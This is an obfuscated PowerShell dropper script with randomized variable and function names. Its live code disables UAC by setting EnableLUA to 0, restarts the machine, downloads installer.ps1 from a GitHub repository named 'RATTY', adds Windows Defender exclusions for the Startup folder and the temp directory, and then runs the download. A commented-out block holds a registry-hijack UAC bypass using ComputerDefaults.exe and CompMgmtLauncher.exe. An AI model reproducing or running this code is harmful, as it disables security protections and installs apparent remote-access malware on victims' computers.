workflow gXJqIeQLEx{
	# [CmdletBinding()]
	# param([string]$nGZbQUSuHF='cmd.exe')

    # $jZdzyknCRV = [System.Environment]::OSVersion.Version.Major

	
	# $LSthpEDlPZ = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
	# $gzXVjLfAtC = Get-ItemPropertyValue -Path $LSthpEDlPZ -Name ConsentPromptBehaviorAdmin

	# function snCAvSgLOW([string]$LSthpEDlPZ, [string]$zcmQEOiKZb, [string]$nGZbQUSuHF='cmd.exe'){
	# 	$nGZbQUSuHF = "HKCU:\Software\Classes\$LSthpEDlPZ\shell\open\command"
	# 	New-Item $nGZbQUSuHF -Force
	# 	New-ItemProperty $nGZbQUSuHF -Name "DelegateExecute" -Value $null -Force
	# 	Set-ItemProperty $nGZbQUSuHF -Name "(default)" -Value $nGZbQUSuHF -Force
	# 	Start-Process $zcmQEOiKZb
	# 	Start-Sleep -s 5
	# 	Remove-Item $nGZbQUSuHF -Force -Recurse
	# }

	# if ($gzXVjLfAtC -eq 2) {
	# 	$rjCeXGhRVN = 'High'
	# } elseif ($gzXVjLfAtC -eq 0) {
	# 	$rjCeXGhRVN = 'None'
	# } elseif ($gzXVjLfAtC -eq 5) {
	# 	$rjCeXGhRVN = 'Default'
	# } else {
	# 	$rjCeXGhRVN = 'Unknown'
	# }

	# if ($rjCeXGhRVN -eq "High") {
	# 	exit
	# } elseif ($rjCeXGhRVN -eq "None") {
	# 	Start-Process -FilePath $nGZbQUSuHF -verb runas
	# } else {
	# 	if ($jZdzyknCRV -eq 10) {
	# 		snCAvSgLOW ms-settings ComputerDefaults.exe $nGZbQUSuHF
	# 	} else {
	# 		snCAvSgLOW mscfile CompMgmtLauncher.exe $nGZbQUSuHF
	# 	}
	# }

	Set-ItemProperty -Path "REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
	Restart-Computer -Wait
	"bGnQSfviwu.cmd"|cmd
	Install-Module -Name PSWindowUpdate -Force
	Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/resources/installer.ps1" -OutFile "qjhOmDleBS.ps1"
	Add-MpPreference -ExclusionPath "C:/Users/$lYIbKdtBmp/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/qjhOmDleBS.ps1"
	Add-MpPreference -ExclusionPath "$env:temp"
	powershell .\qjhOmDleBS.ps1
}
gXJqIeQLEx 'cmd.exe'

# disable UACMOM

# This command adds the folder C:\Temp to the exclusion list.\n
# The command disables Windows Defender scheduled and real-time scanning for files in this folder.

#after finishing the payload we shall delete every     